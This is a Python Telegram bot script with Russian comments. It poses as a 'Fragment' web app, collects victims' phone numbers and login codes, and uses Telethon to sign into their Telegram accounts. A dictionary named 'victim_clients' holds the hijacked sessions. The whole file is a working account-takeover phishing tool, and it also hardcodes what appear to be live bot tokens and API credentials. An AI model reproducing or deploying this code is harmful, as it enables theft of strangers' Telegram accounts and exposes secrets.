import json, asyncio, logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import WebAppInfo, MenuButtonWebApp
from telethon import TelegramClient

# --- ТВОИ ДАННЫЕ ---
BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
ADMIN_ID = 174415647
WEB_APP_URL = "https://dreiner.onrender.com"

# --- ВВЕДИ СВОЙ НОМЕР ДЛЯ АВТОРИЗАЦИИ АДМИНА ---
YOUR_PHONE = "+79000000000" # Твой номер здесь!

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
admin_client = TelegramClient('admin_auth', API_ID, API_HASH)
victim_clients = {}

@dp.message(Command("start"))
async def start(m: types.Message):
    if m.from_user.id != ADMIN_ID: return
    await bot.set_chat_menu_button(chat_id=m.chat.id, menu_button=MenuButtonWebApp(text="Fragment", web_app=WebAppInfo(url=WEB_APP_URL)))
    await m.answer("🚀 Панель активирована! Узоры на фоне должны быть видны.")

@dp.message(F.web_app_data)
async def handle_data(m: types.Message):
    data = json.loads(m.web_app_data.data)
    action, phone = data.get("action"), data.get("phone")
    
    if action == "send_code":
        await m.answer(f"📩 Запрашиваю код для `{phone}`...")
        client = TelegramClient(f'v_{phone}', API_ID, API_HASH)
        victim_clients[phone] = client
        await client.connect()
        try:
            await client.send_code_request(phone)
            await m.answer("✅ Код отправлен в Telegram!")
        except Exception as e: await m.answer(f"❌ Ошибка: {e}")

    elif action == "login_and_del":
        code, client = data.get("code"), victim_clients.get(phone)
        try:
            await client.sign_in(phone, code)
            await m.answer(f"🔓 Вход в `{phone}` успешен!")
        except Exception as e: await m.answer(f"❌ Ошибка входа: {e}")

# Функция для ввода кода через Telegram, а не через консоль
@dp.message(F.text.regexp(r'^\d{5}$'))
async def catch_admin_code(message: types.Message):
    if message.from_user.id == ADMIN_ID and not await admin_client.is_user_authorized():
        try:
            await admin_client.sign_in(YOUR_PHONE, message.text)
            await message.answer("✅ Админ успешно авторизован! Теперь бот может отправлять коды.")
        except Exception as e:
            await message.answer(f"❌ Ошибка авторизации: {e}")

async def main():
    await admin_client.connect()
    if not await admin_client.is_user_authorized():
        # Если не залогинены, просим код
        await admin_client.send_code_request(YOUR_PHONE)
        print("--- ВВЕДИ КОД ИЗ ТЕЛЕГРАМА ПРЯМО В БОТА ---")
    
    await dp.start_polling(bot)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
